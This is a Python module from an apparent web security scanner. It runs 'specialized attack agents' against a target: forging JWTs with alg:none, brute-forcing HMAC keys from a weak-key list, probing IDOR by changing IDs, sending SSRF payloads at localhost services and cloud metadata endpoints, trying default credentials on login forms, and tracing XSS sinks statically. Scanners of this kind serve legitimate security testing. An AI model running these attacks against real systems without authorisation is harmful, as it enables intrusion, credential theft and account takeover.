"""Specialized attack-domain agents (JWT, SSRF, auth, XSS)."""
import base64
import hashlib
import hmac
import re

from secscan.http_client import http_get, http_post
from secscan.phases._imports import *  # noqa: F403

# ── Specialized Attack Domain Agents ────────────────────────────────────────────

# ─ JWT constants ──────────────────────────────────────────────────────────────
_JWT_WEAK_KEYS = [
    "secret", "password", "key", "jwt", "test", "123456", "qwerty",
    "admin", "secret123", "jwt_secret", "mysecret", "changeme",
    "supersecret", "jwtkey", "app_secret", "api_secret", "token",
    "letmein", "p@ssw0rd", "pass", "auth", "your-256-bit-secret",
    "your-secret-key", "HS256", "RS256", "none",
]

# ─ SSRF targets ───────────────────────────────────────────────────────────────
_SSRF_TARGETS = [
    ("http://127.0.0.1/",                       "localhost HTTP"),
    ("http://127.0.0.1:22/",                    "localhost SSH"),
    ("http://127.0.0.1:3306/",                  "localhost MySQL"),
    ("http://127.0.0.1:5432/",                  "localhost PostgreSQL"),
    ("http://127.0.0.1:6379/",                  "localhost Redis"),
    ("http://127.0.0.1:9200/",                  "localhost Elasticsearch"),
    ("http://127.0.0.1:8080/",                  "localhost alt HTTP"),
    ("http://169.254.169.254/latest/meta-data/","AWS Instance Metadata"),
    ("http://metadata.google.internal/",        "GCP Metadata"),
    ("http://100.100.100.200/latest/meta-data/","Alibaba Cloud Metadata"),
]
_SSRF_PARAM_NAMES = {
    "url", "webhook", "callback", "endpoint", "target", "src", "source",
    "href", "link", "fetch", "load", "proxy", "redirect", "request",
    "uri", "path", "dest", "resource", "image", "file", "download",
}
_SSRF_RESPONSE_MARKERS = [
    "SSH-", "redis_version", "elastic", "mysql", "postgres", "mongod",
    "ami-id", "instance-id", "meta-data", "computeMetadata",
]

# ─ Auth constants ─────────────────────────────────────────────────────────────
_COMMON_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", ""),
    ("admin", "admin123"), ("test", "test"), ("root", "root"),
    ("user", "user"), ("admin", "123456"), ("guest", "guest"),
]
_AUTH_SUCCESS_HINTS = [
    "dashboard", "welcome", "logout", "sign out", "log out",
    "profile", "my account", "settings", "/dashboard",
]
_AUTH_FAIL_HINTS = [
    "invalid", "incorrect", "failed", "error", "wrong",
    "denied", "unauthorized", "bad credentials",
]

# ─ XSS taint patterns ─────────────────────────────────────────────────────────
_TAINT_SOURCES_PY = [
    r"request\.args(?:\.get)?\s*[\[(]",
    r"request\.form(?:\.get)?\s*[\[(]",
    r"request\.json", r"request\.get_json\(",
    r"request\.data",
    r"request\.GET\s*[\[(]", r"request\.POST\s*[\[(]",
    r"request\.cookies(?:\.get)?\s*[\[(]",
]
_TAINT_SINKS_PY = [
    (r"Markup\s*\(",                "Jinja2 Markup() — marks string as safe HTML"),
    (r"render_template_string\s*\(","render_template_string() with user input"),
    (r"\beval\s*\(",                "eval() with possible user input"),
    (r"\bexec\s*\(",                "exec() with possible user input"),
    (r"os\.system\s*\(",           "os.system() shell injection"),
    (r"subprocess\.\w+\s*\(",      "subprocess call — possible command injection"),
]
_TAINT_SOURCES_JS = [
    r"location\.search", r"location\.hash",
    r"document\.URL", r"document\.referrer",
    r"req\.body\.\w+", r"req\.query\.\w+", r"req\.params\.\w+",
]
_TAINT_SINKS_JS = [
    (r"innerHTML\s*=",             "innerHTML sink — direct DOM injection"),
    (r"outerHTML\s*=",             "outerHTML sink"),
    (r"insertAdjacentHTML\s*\(",  "insertAdjacentHTML sink"),
    (r"document\.write\s*\(",     "document.write sink"),
    (r"\beval\s*\(",               "eval() sink"),
    (r"setTimeout\s*\(\s*['\"`]", "setTimeout with string argument"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Agent 1 — JWT: alg:none, weak key, RS256 confusion
# ─────────────────────────────────────────────────────────────────────────────

def _jwt_decode_header(token: str) -> dict | None:
    try:
        part = token.split(".")[0]
        part += "=" * (4 - len(part) % 4)
        return json.loads(base64.urlsafe_b64decode(part))
    except Exception:
        return None


def _jwt_forge_alg_none(token: str) -> str | None:
    header = _jwt_decode_header(token)
    if not header:
        return None
    header["alg"] = "none"
    new_hdr = base64.urlsafe_b64encode(
        json.dumps(header, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()
    return f"{new_hdr}.{token.split('.')[1]}."


def _jwt_brute_key(token: str) -> str | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    msg = f"{parts[0]}.{parts[1]}".encode()
    try:
        sig = base64.urlsafe_b64decode(parts[2] + "==")
    except Exception:
        return None
    for key in _JWT_WEAK_KEYS:
        expected = hmac.new(key.encode(), msg, hashlib.sha256).digest()
        if hmac.compare_digest(sig, expected):
            return key
    return None


def _jwt_send(url: str, token: str, cookie_name: str | None) -> int:
    try:
        headers = {"User-Agent": "SecurityAudit/1.0"}
        if cookie_name:
            headers["Cookie"] = f"{cookie_name}={token}"
        else:
            headers["Authorization"] = f"Bearer {token}"
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return -1


def _agent_jwt(url: str, phases: dict) -> dict:
    findings: list[dict] = []

    # Discover JWT tokens from Set-Cookie header
    _, _, hdrs = http_get(url, timeout=8)
    set_cookie = hdrs.get("Set-Cookie", "") or hdrs.get("set-cookie", "")
    jwt_tokens: list[tuple[str | None, str]] = []

    for chunk in set_cookie.split(";"):
        chunk = chunk.strip()
        if "=" in chunk:
            k, v = chunk.split("=", 1)
            v = v.strip()
            if len(v.split(".")) == 3 and all(v.split(".")):
                jwt_tokens.append((k.strip(), v))

    if not jwt_tokens:
        return {"count": 0, "findings": [], "info": "No JWT tokens discovered in response cookies"}

    for cookie_name, token in jwt_tokens[:3]:
        hdr = _jwt_decode_header(token)
        alg = (hdr or {}).get("alg", "unknown")

        # Test 1: alg:none
        forged = _jwt_forge_alg_none(token)
        if forged:
            status = _jwt_send(url, forged, cookie_name)
            if status not in (401, 403, -1):
                findings.append({
                    "type": "JWT alg:none", "result": EXPLOITED, "severity": "CRITICAL",
                    "cookie": cookie_name,
                    "evidence": f"Server accepted JWT with alg:none (HTTP {status}) — signature verification bypassed",
                })

        # Test 2: weak HMAC key
        if alg.startswith("HS"):
            found_key = _jwt_brute_key(token)
            if found_key:
                findings.append({
                    "type": "JWT Weak Signing Key", "result": EXPLOITED, "severity": "CRITICAL",
                    "cookie": cookie_name,
                    "evidence": f"JWT signed with weak key: '{found_key}'",
                    "key": found_key,
                })

        # Test 3: RS256 → flag for manual algorithm confusion
        if alg == "RS256":
            findings.append({
                "type": "JWT RS256 Algorithm Confusion Risk", "result": POTENTIAL, "severity": "HIGH",
                "cookie": cookie_name,
                "evidence": "RS256 token found — may be vulnerable to HS256 confusion attack if public key is obtainable",
            })

    confirmed = [f for f in findings if f["result"] == EXPLOITED]
    return {"count": len(confirmed), "confirmed": confirmed,
            "potential": [f for f in findings if f["result"] == POTENTIAL], "findings": findings}


# ─────────────────────────────────────────────────────────────────────────────
# Agent 2 — IDOR / Horizontal Privilege Escalation
# ─────────────────────────────────────────────────────────────────────────────

def _agent_idor(url: str, phases: dict) -> dict:
    findings: list[dict] = []
    id_pat = re.compile(r"(/\d{1,10})(?=/|$|\?|#)")

    api_eps: list[str] = []
    if "browser" in phases:
        br = phases["browser"].get("browser", {})
        api_eps = list(br.get("attack_surface", {}).get("api_endpoints", []))

    # Phase 0.5 — include ID-like URLs suggested by AI code analysis
    tm = phases.get("ai_code", {}).get("threat_model", {})
    st = tm.get("structured") if isinstance(tm, dict) else None
    if isinstance(st, dict):
        base = url.rstrip("/")
        for c in st.get("attack_candidates") or []:
            if not isinstance(c, dict):
                continue
            p = (c.get("path_or_url") or "").strip()
            if not p or not id_pat.search(p):
                continue
            if p.startswith("http://") or p.startswith("https://"):
                if p not in api_eps:
                    api_eps.append(p)
            else:
                full = base + (p if p.startswith("/") else "/" + p)
                if full not in api_eps:
                    api_eps.append(full)

    id_urls = [ep for ep in api_eps if id_pat.search(ep)][:8]
    if not id_urls:
        return {"count": 0, "findings": [], "info": "No ID-based API endpoints discovered"}

    for endpoint in id_urls:
        m = id_pat.search(endpoint)
        if not m:
            continue
        original_id = int(m.group(1).lstrip("/"))
        _, orig_body, _ = http_get(endpoint, timeout=8)

        for delta in (-1, 1, 2, -2):
            nb_id = original_id + delta
            if nb_id <= 0:
                continue
            nb_url = endpoint[:m.start()] + f"/{nb_id}" + endpoint[m.end():]
            status, body, _ = http_get(nb_url, timeout=8)

            if status == 200 and body and body != orig_body:
                findings.append({
                    "type": "IDOR — Horizontal Privilege Escalation", "result": EXPLOITED,
                    "severity": "HIGH", "original": endpoint, "tested": nb_url,
                    "evidence": f"ID {nb_id} → HTTP 200 with different content ({len(body)} vs {len(orig_body)} chars)",
                })
                break
            elif status == 200 and body == orig_body:
                findings.append({
                    "type": "Possible IDOR", "result": POTENTIAL, "severity": "MEDIUM",
                    "tested": nb_url,
                    "evidence": f"ID {nb_id} returned 200 with identical content — access control may be missing",
                })

    confirmed = [f for f in findings if f["result"] == EXPLOITED]
    return {"count": len(confirmed), "confirmed": confirmed,
            "potential": [f for f in findings if f["result"] == POTENTIAL], "findings": findings}


# ─────────────────────────────────────────────────────────────────────────────
# Agent 3 — SSRF with Internal Network Recon
# ─────────────────────────────────────────────────────────────────────────────

def _agent_ssrf(url: str, phases: dict) -> dict:
    findings: list[dict] = []
    forms: list[dict] = []
    if "browser" in phases:
        br = phases["browser"].get("browser", {})
        forms = br.get("attack_surface", {}).get("forms", [])

    # Collect (action, method, param_name) for URL-type params
    url_params: list[tuple[str, str, str]] = []
    for form in forms:
        action = form.get("action") or url
        method = (form.get("method") or "GET").upper()
        for inp in form.get("inputs", []):
            if (inp.get("name") or "").lower() in _SSRF_PARAM_NAMES:
                url_params.append((action, method, inp["name"]))

    parsed_base = urllib.parse.urlparse(url)
    for param in urllib.parse.parse_qs(parsed_base.query):
        if param.lower() in _SSRF_PARAM_NAMES:
            url_params.append((url, "GET", param))

    if not url_params:
        return {"count": 0, "findings": [], "info": "No URL-type parameters discovered"}

    for action, method, param in url_params[:5]:
        _, baseline, _ = http_get(f"{action}?{param}=http://example.com", timeout=6)

        for target_url, label in _SSRF_TARGETS:
            fd = {param: target_url}
            if method == "POST":
                status, body = http_post(action, fd, timeout=6)
            else:
                status, body, _ = http_get(f"{action}?{urllib.parse.urlencode(fd)}", timeout=6)

            if status in (-1, -2):
                continue

            hit_marker = next((m for m in _SSRF_RESPONSE_MARKERS if m.lower() in body.lower()), None)
            if hit_marker:
                findings.append({
                    "type": "SSRF", "result": EXPLOITED, "severity": "CRITICAL",
                    "param": param, "target": target_url, "label": label,
                    "evidence": f"Response contained internal service marker '{hit_marker}'",
                })
            elif body and body != baseline and len(body) > 20:
                findings.append({
                    "type": "Possible SSRF", "result": POTENTIAL, "severity": "HIGH",
                    "param": param, "target": target_url, "label": label,
                    "evidence": f"Response differs from baseline with param={target_url} ({len(body)} chars)",
                })

    confirmed = [f for f in findings if f["result"] == EXPLOITED]
    return {"count": len(confirmed), "confirmed": confirmed,
            "potential": [f for f in findings if f["result"] == POTENTIAL], "findings": findings}


# ─────────────────────────────────────────────────────────────────────────────
# Agent 4 — XSS Source→Sink Taint Tracing (Static)
# ─────────────────────────────────────────────────────────────────────────────

def _agent_xss_taint(scan_path: str) -> dict:
    findings: list[dict] = []
    py_files = list(Path(scan_path).rglob("*.py"))[:30]
    js_files = (list(Path(scan_path).rglob("*.js")) +
                list(Path(scan_path).rglob("*.ts")))[:20]

    def _scan(filepath: Path, src_pats: list, sink_pats: list) -> list[dict]:
        hits: list[dict] = []
        try:
            lines = filepath.read_text(encoding="utf-8", errors="ignore").splitlines()
        except Exception:
            return []
        source_lines = [
            i + 1 for i, line in enumerate(lines)
            if any(re.search(p, line) for p in src_pats)
        ]
        for sink_pat, sink_desc in sink_pats:
            for i, line in enumerate(lines, 1):
                if re.search(sink_pat, line):
                    nearby = [s for s in source_lines if 0 < (i - s) <= 50]
                    if nearby:
                        hits.append({
                            "type": "XSS Taint Flow", "result": POTENTIAL, "severity": "HIGH",
                            "file": str(filepath), "sink_line": i, "sink": sink_desc,
                            "source_lines": nearby,
                            "evidence": f"User input flows to '{sink_desc}' at line {i} (sources near lines {nearby})",
                        })
        return hits

    for f in py_files:
        findings.extend(_scan(f, _TAINT_SOURCES_PY, _TAINT_SINKS_PY))
    for f in js_files:
        findings.extend(_scan(f, _TAINT_SOURCES_JS, _TAINT_SINKS_JS))

    return {"count": len(findings), "findings": findings,
            "files_scanned": len(py_files) + len(js_files)}


# ─────────────────────────────────────────────────────────────────────────────
# Agent 5 — Auth Bypass, MFA Weaknesses, OAuth Flaws
# ─────────────────────────────────────────────────────────────────────────────

def _find_login_form(forms: list[dict]) -> dict | None:
    return next(
        (f for f in forms
         if any(i.get("type") == "password" for i in f.get("inputs", []))),
        None,
    )


def _agent_auth(url: str, phases: dict) -> dict:
    findings: list[dict] = []
    forms: list[dict] = []
    api_eps: list[str] = []

    if "browser" in phases:
        br = phases["browser"].get("browser", {})
        forms   = br.get("attack_surface", {}).get("forms", [])
        api_eps = br.get("attack_surface", {}).get("api_endpoints", [])

    login_form = _find_login_form(forms)
    user_field = "username"
    pass_field = "password"

    if login_form:
        inputs = login_form.get("inputs", [])
        action = login_form.get("action") or url
        method = (login_form.get("method") or "POST").upper()
        user_field = next(
            (i["name"] for i in inputs
             if i.get("type") not in ("password", "hidden", "submit") and i.get("name")),
            "username",
        )
        pass_field = next(
            (i["name"] for i in inputs if i.get("type") == "password" and i.get("name")),
            "password",
        )

        # ── Common credentials ───────────────────────────────────────────────
        for uname, pwd in _COMMON_CREDS[:6]:
            fd = {user_field: uname, pass_field: pwd}
            if method == "POST":
                status, body = http_post(action, fd, timeout=8)
            else:
                status, body, _ = http_get(f"{action}?{urllib.parse.urlencode(fd)}", timeout=8)
            bl = body.lower()
            if (status in (200, 302)
                    and any(h in bl for h in _AUTH_SUCCESS_HINTS)
                    and not any(h in bl for h in _AUTH_FAIL_HINTS)):
                findings.append({
                    "type": "Auth Bypass — Default Credentials", "result": EXPLOITED,
                    "severity": "CRITICAL",
                    "evidence": f"Login succeeded with {uname}:{pwd or '(empty password)'}",
                })
                break

        # ── Rate limiting / brute-force protection ───────────────────────────
        statuses = []
        for _ in range(10):
            fd = {user_field: "admin", pass_field: "wrongXpassword99"}
            if method == "POST":
                s, _ = http_post(action, fd, timeout=5)
            else:
                s, _, _ = http_get(f"{action}?{urllib.parse.urlencode(fd)}", timeout=5)
            statuses.append(s)

        if len(set(statuses)) == 1 and statuses[0] not in (429, 423, 403):
            findings.append({
                "type": "Missing Rate Limiting on Login", "result": POTENTIAL,
                "severity": "HIGH", "cwe": "CWE-307",
                "evidence": f"10 consecutive login attempts all returned HTTP {statuses[0]} — no lockout or rate limiting detected",
            })

    # ── OAuth / OIDC checks ──────────────────────────────────────────────────
    for ep in api_eps:
        params = urllib.parse.parse_qs(urllib.parse.urlparse(ep).query)
        if "client_id" in params or "response_type" in params:
            if "state" not in params:
                findings.append({
                    "type": "OAuth Missing state Parameter", "result": POTENTIAL,
                    "severity": "HIGH", "url": ep,
                    "evidence": "OAuth flow without 'state' parameter — CSRF on OAuth login possible",
                })
            if params.get("response_type", [""])[0] == "token":
                findings.append({
                    "type": "OAuth Implicit Flow (Deprecated)", "result": POTENTIAL,
                    "severity": "MEDIUM", "url": ep,
                    "evidence": "response_type=token (implicit flow) is deprecated and leaks tokens in URL fragment",
                })

    confirmed = [f for f in findings if f["result"] == EXPLOITED]
    return {"count": len(confirmed), "confirmed": confirmed,
            "potential": [f for f in findings if f["result"] == POTENTIAL], "findings": findings}


# ─────────────────────────────────────────────────────────────────────────────
# Phase 5b — Orchestrator
# ─────────────────────────────────────────────────────────────────────────────

def phase_specialized_agents(url: str, scan_path: str, phases: dict) -> dict:
    header("Phase 5b — Specialized Attack Domain Agents")
    results: dict = {}

    # Agent 1: JWT
    info("[Agent 1/5] JWT — alg:none, weak key, RS256 confusion...")
    r = _agent_jwt(url, phases)
    results["jwt"] = r
    confirmed = r.get("confirmed", [])
    if confirmed:
        fail(f"JWT — {len(confirmed)} confirmed")
        for f in confirmed:
            print(f"    {RED}→{RESET} [{f['severity']}] {f['type']}: {f['evidence'][:80]}")
    else:
        ok(f"JWT — {r.get('info', 'no confirmed vulnerabilities')}")

    # Agent 2: IDOR
    info("[Agent 2/5] IDOR — horizontal privilege escalation...")
    r = _agent_idor(url, phases)
    results["idor"] = r
    confirmed = r.get("confirmed", [])
    if confirmed:
        fail(f"IDOR — {len(confirmed)} confirmed")
        for f in confirmed:
            print(f"    {RED}→{RESET} {f['evidence'][:80]}")
    else:
        ok(f"IDOR — {r.get('info', 'no confirmed vulnerabilities')}")

    # Agent 3: SSRF
    info("[Agent 3/5] SSRF — internal network recon...")
    r = _agent_ssrf(url, phases)
    results["ssrf"] = r
    confirmed = r.get("confirmed", [])
    if confirmed:
        fail(f"SSRF — {len(confirmed)} confirmed")
        for f in confirmed:
            print(f"    {RED}→{RESET} [{f['label']}] {f['evidence'][:80]}")
    else:
        ok(f"SSRF — {r.get('info', 'no confirmed vulnerabilities')}")

    # Agent 4: XSS taint (static)
    info("[Agent 4/5] XSS — source→sink taint tracing (static analysis)...")
    r = _agent_xss_taint(scan_path)
    results["xss_taint"] = r
    if r["count"]:
        fail(f"XSS Taint — {r['count']} flow(s) across {r['files_scanned']} files")
        for f in r["findings"][:3]:
            if not isinstance(f, dict):
                continue
            _fp = f.get("file") or "unknown"
            print(
                f"    {RED}→{RESET} {Path(str(_fp)).name}:{f.get('sink_line', '?')} — {f.get('sink', '')}"
            )
    else:
        ok(f"XSS Taint — 0 flows ({r['files_scanned']} files scanned)")

    # Agent 5: Auth / OAuth / rate limiting
    info("[Agent 5/5] Auth — bypass, OAuth flaws, rate limiting...")
    r = _agent_auth(url, phases)
    results["auth"] = r
    confirmed = r.get("confirmed", [])
    potential = r.get("potential", [])
    if confirmed:
        fail(f"Auth — {len(confirmed)} confirmed bypass(es)")
        for f in confirmed:
            print(f"    {RED}→{RESET} [{f['severity']}] {f['evidence'][:80]}")
    elif potential:
        warn(f"Auth — {len(potential)} potential issue(s)")
        for f in potential[:3]:
            print(f"    {YELLOW}→{RESET} [{f['severity']}] {f['type']}: {f['evidence'][:70]}")
    else:
        ok("Auth — no issues detected")

    total = sum(v.get("count", 0) for v in results.values() if isinstance(v, dict))
    info(f"Specialized agents complete — {total} confirmed finding(s) across 5 domains")
    return results

